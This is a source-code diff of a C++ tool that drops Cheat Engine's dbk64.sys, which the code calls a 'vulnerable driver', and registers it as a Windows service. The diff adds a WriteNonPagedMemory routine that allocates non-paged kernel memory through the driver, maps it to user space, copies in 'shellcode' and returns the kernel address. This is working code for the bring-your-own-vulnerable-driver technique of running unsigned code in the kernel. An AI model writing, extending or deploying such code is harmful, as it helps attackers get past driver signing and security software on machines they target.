@@ -23,7 +23,7 @@ BOOL ce_driver::Load() {
 	
 	// TODO: check the dbk64.sys service is already running.
 	//if (ce_driver::IsRunning()) {
-	//	Log(L"[-] \\Device\\Nal is already in use." << std::endl);
+	//	Log2(L"[-] \\Device\\Nal is already in use." << std::endl);
 	//	return INVALID_HANDLE_VALUE;
 	//}
 
@@ -37,29 +37,22 @@ BOOL ce_driver::Load() {
 	for (int i = 0; i < len; ++i)
 		ce_driver::driver_name[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
 	*/
-	Log("Loading vulnerable driver: %s", ce_driver::driver_name);
+	Log("Loading provider driver: %s", ce_driver::driver_name);
 
 	std::wstring driver_path = GetDriverPath();
 	if (driver_path.empty()) {
-		Log("Can't find TEMP folder");
+		Error("Can't find TEMP folder");
 		return result;
 	}
 
 	_wremove(driver_path.c_str());
-
-	// HelloWorld.sys
-	//if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(helloworld_driver_resource::driver), sizeof(helloworld_driver_resource::driver))) {
-	//	Log("Failed to create vulnerable driver file");
-	//	return result;
-	//}
-
 	
 #ifdef  _DEBUG
 
 	// self compiled dbk64.sys
 	driver_path.pop_back();
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(test_dbk64_driver_resource::driver), sizeof(test_dbk64_driver_resource::driver))) {
-		Log("Failed to create vulnerable driver file");
+        Error("Failed to create vulnerable driver file");
 		return result;
 	}
 
@@ -67,7 +60,7 @@ BOOL ce_driver::Load() {
 
 	// dbk64.sys
 	if (!utils::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(dbk64_driver_resource::driver), sizeof(dbk64_driver_resource::driver))) {
-		Log("Failed to create vulnerable driver file");
+        Error("Failed to create vulnerable driver file");
 		return result;
 	}
 
@@ -75,7 +68,7 @@ BOOL ce_driver::Load() {
 
 
 	if (!service::RegisterAndStart(driver_path)) {
-		Log("Failed to register and start service for the vulnerable driver");
+        Error("Failed to register and start service for the vulnerable driver");
 		_wremove(driver_path.c_str());
 		return result;
 	}
@@ -264,4 +257,43 @@ bool ce_driver::CallDriverEntry(HANDLE hDevice, UINT64 EntryPoint) {
     else
         return FALSE;
 
+}
+
+PVOID64 ce_driver::WriteNonPagedMemory(HANDLE hDevice, PVOID lpBuffer, SIZE_T nSize) {
+
+    UINT64 kernelShellcodeBuf = NULL;
+    UINT64 sharedBuf = NULL;
+    UINT64 Mdl = NULL;
+
+    kernelShellcodeBuf = ce_driver::AllocateNonPagedMem(hDevice, nSize);
+    if (kernelShellcodeBuf == NULL) {
+        Error("AllocateNoPagedMem failed");
+        return nullptr;
+    }
+
+    Log2("Kernel memory has been allocatted at 0x%p", kernelShellcodeBuf);
+
+    // Create an MDL for the buffer allocated above and make it accessible from user space.
+
+    if (!ce_driver::CreateSharedMemory(hDevice, kernelShellcodeBuf, &sharedBuf, &Mdl, nSize)) {
+        Error("CreateSharedMemory failed");
+        return nullptr;
+    }
+
+    Log2("Shared memory for shellcode has been created in user space at 0x%p (MDL: 0x%p)", sharedBuf, Mdl);
+
+    // Write shellcode to shared memory
+
+    memcpy((void*)sharedBuf, lpBuffer, nSize);
+
+    // Unmapping of memory allocated to user space
+
+    if (!ce_driver::UnMapSharedMemory(hDevice, sharedBuf, Mdl)) {
+        Error("UnMapSharedMemory failed");
+        return nullptr;
+    }
+
+    Log2("Successfully removed shared memory from user space...");
+
+    return (PVOID64)kernelShellcodeBuf;
 }
